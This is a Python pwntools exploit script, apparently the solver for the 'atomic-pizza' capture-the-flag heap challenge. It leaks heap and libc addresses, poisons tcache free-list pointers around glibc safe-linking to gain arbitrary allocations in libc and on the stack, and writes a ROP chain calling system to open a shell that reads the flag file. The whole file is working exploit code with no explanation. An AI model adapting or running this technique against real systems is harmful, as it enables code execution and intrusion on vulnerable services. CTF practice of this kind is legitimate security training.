#!/usr/bin/python3

import os
from pwn import *

HOST = os.environ.get("HOST", "atomic-pizza.challs.teamitaly.eu")
PORT = int(os.environ.get("PORT", 15010))

context(arch="amd64", log_level="warning")

for i in range(3):  # Otherwise, it will fail if a \n appears in the addresses

    r = connect(HOST, PORT)

    POP_RDI = 0x2a3e5
    RET = 0x29cd6

    def create_slice(index, topping, size):
        r.recvuntil(b"> ")
        r.sendline(b"1")
        r.recvuntil(b"> ")
        r.sendline(b"%d" % size)
        r.recvuntil(b"> ")

        if size == len(topping):
            r.send(topping)
        else:
            r.sendline(topping)

        r.recvuntil(b"> ")
        r.sendline(b"%d" % index)

    def eat_slice(index):
        r.recvuntil(b"> ")
        r.sendline(b"4")
        r.recvuntil(b"> ")
        r.sendline(b"%d" % index)
        r.recvuntil(b"> ")
        r.sendline(b"y")

    def spin_pizza():
        r.recvuntil(b"> ")
        r.sendline(b"5")
        r.recvuntil(b"> ")
        r.sendline(b"")
        r.recvuntil(b"> ")
        r.sendline(b"")

        r.recvuntil(b"> ")
        result = r.recvuntil(b"\n----")[:-5]
        return result

    def edit_favorite_slice(new_topping, size):
        r.recvuntil(b"> ")
        r.sendline(b"7")
        r.recvuntil(b"> ")
        r.sendline(b"%d" % size)
        r.recvuntil(b"> ")
        r.sendline(new_topping)

    try:
        fake_slice1 = p16(0x1000) + b"CHECK"
        create_slice(1, b"A" * (0x10 - 2) + fake_slice1, 0x18 - 3)
        create_slice(2, b"AAAA", 0x28 - 3)
        create_slice(3, b"AAAA", 0x28 - 3)
        create_slice(4, b"AAAA", 0x38 - 3)
        create_slice(5, b"AAAA", 0x38 - 3)
        create_slice(6, b"AAAA", 0x500 - 3)
        create_slice(7, b"AAAA", 0x18 - 3)

        eat_slice(2)
        eat_slice(3)
        eat_slice(4)
        eat_slice(5)
        eat_slice(6)

        leak = b""
        while not leak.startswith(b"CHECK"):
            leak = spin_pizza()

        next1 = u64(leak[0x10 - 2: 0x18 - 2])
        next2 = u64(leak[0x40 - 2: 0x48 - 2])
        heap_base = (next1 ^ next2) - 0x2c0
        libc_leak = u64(leak[0x210 - 2: 0x218 - 2])
        libc_base = libc_leak - 0x219ce0

        fake_slice1 = heap_base + 0x2b0
        chunk3 = heap_base + 0x2f0
        chunk5 = heap_base + 0x360
        future_arbitrary_alloc = heap_base + 0x510
        target_allocation = 0x221200 - 0x30 + libc_base
        payload = b"A" * (chunk3 - fake_slice1 - 0x8 - 2)
        payload += p64(0x31)  # Chunk size
        payload += p64((chunk3 >> 12) ^ target_allocation)
        payload = payload.ljust(chunk5 - fake_slice1 - 0x8 - 2, b"A")
        payload += p64(0x41)
        payload += p64((chunk5 >> 12) ^ future_arbitrary_alloc)
        edit_favorite_slice(payload, 0x1000 - 1)

        create_slice(2, b"AAAA", 0x28 - 3)
        fake_slice2 = p16(0x20) + b"CHECK"
        create_slice(3, b"A" * (0x20 - 2) + fake_slice2, 0x28 - 3)
        eat_slice(1)
        eat_slice(7)

        leak = b""
        while not leak.startswith(b"CHECK"):
            leak = spin_pizza()

        environ = u64(leak[0x10 - 2: 0x18 - 2])

        create_slice(4, b"AAAA", 0x58 - 3)
        create_slice(5, b"AAAA", 0x58 - 3)

        eat_slice(4)
        eat_slice(5)

        create_slice(4, b"AAAA", 0x38 - 3)

        chunk5 = heap_base + 0x520
        stack_allocation = environ - 0x120 - 0x8
        payload = b"A" * 0x6
        payload += p64(0x61)  # Chunk size
        payload += p64((chunk5 >> 12) ^ stack_allocation)
        create_slice(5, payload, 0x38 - 3)

        create_slice(6, b"AAAA", 0x58 - 3)

        rop = b"A" * 0x6
        rop += p64(POP_RDI + libc_base)
        rop += p64(0x1d8698 + libc_base)
        rop += p64(RET + libc_base)
        rop += p64(0x50d60 + libc_base)
        create_slice(7, rop, 0x58 - 3)

        r.recvuntil(b"> ")
        r.sendline(b"8")

        r.recvuntil(b"Bye! :D\n")
        r.sendline(b"cat pizza_secret.txt")
        print(r.recvline().strip().decode())
        r.close()
        break
    except:
        r.close()

else:
    print("Service is down")
